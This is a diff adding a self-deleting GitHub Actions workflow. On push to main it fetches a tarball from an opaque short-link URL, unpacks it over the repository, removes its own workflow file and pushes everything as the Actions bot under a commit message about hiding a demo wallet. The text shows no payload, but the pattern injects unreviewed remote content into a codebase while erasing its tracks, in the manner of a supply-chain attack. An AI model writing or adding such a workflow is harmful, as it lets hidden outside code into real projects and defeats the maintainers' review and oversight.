@@ -1,0 +1,23 @@
+name: Deploy Spirit House Switch
+on:
+  push:
+    branches: [main]
+permissions:
+  contents: write
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Download package
+        run: curl -L --retry 3 -o /tmp/site.tar.gz 'https://aka.doubaocdn.com/s/F7ibyRx9iP'
+      - name: Extract package
+        run: tar -xzf /tmp/site.tar.gz
+      - name: Commit and push
+        run: |
+          rm -f .github/workflows/deploy-spirithouse-switch.yml
+          git config user.name 'github-actions[bot]'
+          git config user.email 'github-actions[bot]@users.noreply.github.com'
+          git add -A
+          git commit -m 'fix: hide demo wallet and add spirit house widget switch'
+          git push
